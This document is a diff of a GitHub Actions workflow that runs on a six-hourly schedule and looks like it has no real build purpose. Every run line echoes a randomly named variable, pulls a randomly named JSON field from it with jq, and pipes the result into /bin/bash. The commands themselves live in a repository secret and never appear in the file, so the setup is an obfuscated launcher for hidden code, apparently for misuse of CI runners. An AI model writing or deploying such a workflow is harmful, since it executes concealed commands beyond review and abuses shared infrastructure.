@@ -1,10 +1,11 @@
 name: xiaoyongsha
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '57 0/6 * * *'
 
-jobs:  # 2815
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +13,24 @@ jobs:  # 2815
       - uses: actions/checkout@v4
       - name: xiaoyongsha
         env:
-          vjlgb8: ${{ secrets.vjlgb8 }}
+          ep734: ${{ secrets.ep734 }}
         run: |
-          echo $vjlgb8 | jq -r .ong6 | /bin/bash
-          echo $ftn8 | jq -r .bagi36 | /bin/bash
-          echo $mto9 | jq -r .rj952 | /bin/bash
-          echo $izv0336 | jq -r .fd49 | /bin/bash
-          echo $yx8743 | jq -r .f26848 | /bin/bash
-          echo $zs3 | jq -r .lang48697 | /bin/bash
-          echo $hmhll9505 | jq -r .tgd376 | /bin/bash
-          echo $ntk2 | jq -r .kj6 | /bin/bash
-          echo $j91 | jq -r .nc3 | /bin/bash
-          echo $t93 | jq -r .pvspr10757 | /bin/bash
+          echo $ep734 | jq -r .pppwy48518 | /bin/bash
+          echo $awvmg55 | jq -r .tzr24 | /bin/bash
+          echo $p56434 | jq -r .kpxm39 | /bin/bash
+          echo $u8 | jq -r .xncu926 | /bin/bash
+          echo $abysy15764 | jq -r .tton9124 | /bin/bash
+          echo $gojm0142 | jq -r .ut7 | /bin/bash
+          echo $zgwh07745 | jq -r .m4337 | /bin/bash
+          echo $kgj31 | jq -r .giqow71567 | /bin/bash
+          echo $q580 | jq -r .kqwq4 | /bin/bash
+          echo $adbef8378 | jq -r .onvb483 | /bin/bash
+          echo $gjfgo24 | jq -r .ru4525 | /bin/bash
+          echo $tmfz9 | jq -r .cpv126 | /bin/bash
+          echo $ihswr552 | jq -r .nprj553 | /bin/bash
+          echo $cpf21 | jq -r .rs4425 | /bin/bash
+          echo $bsh72 | jq -r .erv4740 | /bin/bash
+          echo $ktxp74 | jq -r .l35886 | /bin/bash
+          echo $mch09015 | jq -r .anldb41123 | /bin/bash
+          echo $kgzei178 | jq -r .q82 | /bin/bash
 
